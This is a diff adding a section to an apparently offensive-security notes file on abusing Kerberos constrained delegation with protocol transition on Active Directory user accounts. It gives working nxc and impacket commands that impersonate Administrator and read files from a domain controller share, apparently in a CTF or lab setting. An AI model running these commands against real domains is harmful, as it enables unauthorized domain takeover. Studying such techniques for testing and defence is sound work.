@@ -125,3 +125,33 @@ Apply vendor baselines for logging, least privilege, patch cadence, and segmenta
 ## Sources
 
 - Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
+
+## Constrained delegation on a USER account (not just computers) - find it per-account
+
+The `Identify` queries above filter to `objectCategory=Computer`, but constrained delegation is
+often configured on a **user** account - and that user is frequently the terminal node of a
+ForceChangePassword/ACL chain, so its delegation right is invisible in BloodHound's ACL edge view
+(BloodHound renders `AllowedToDelegate` only toward the target, not as a "this account can impersonate"
+edge). The moment you gain any account, enumerate ITS delegation credlessly:
+
+```bash
+# per-account, all three delegation types in one shot (constrained / unconstrained / RBCD):
+nxc ldap <dc> -u <user> -p <pass> --find-delegation
+# -> "Constrained w/ Protocol Transition   cifs/DC.dom, ..."  = you can impersonate ANY user to that SPN
+```
+
+`Constrained w/ Protocol Transition` (TrustedToAuthForDelegation) means S4U2Self works even though the
+user never authenticated to you, so you impersonate `Administrator` directly:
+
+```bash
+ntpdate <dc>   # avoid KRB_AP_ERR_SKEW; ensure <dc-fqdn> is in /etc/hosts
+impacket-getST -spn cifs/DC.<dom> -impersonate Administrator -dc-ip <dc> '<dom>/<user>:<pass>'
+KRB5CCNAME=Administrator@cifs_DC.<dom>@<REALM>.ccache impacket-smbclient -k -no-pass DC.<dom>
+#   -> read C$\Users\Administrator\Desktop\root.txt directly (no exec, AV-safe)
+```
+
+Lesson: a reset/ACL chain that "dead-ends" (terminal user's outbound edges loop) is a BloodHound-ACL
+blind spot, not a dead end - re-enumerate the terminal account's ATTRIBUTES (`--find-delegation`, SPN,
+group membership) before concluding there is no path to DA. See [[kerberos-service-for-user-extension]].
+
+<!-- promoted-slug: constrained-deleg-on-a-user-find -->
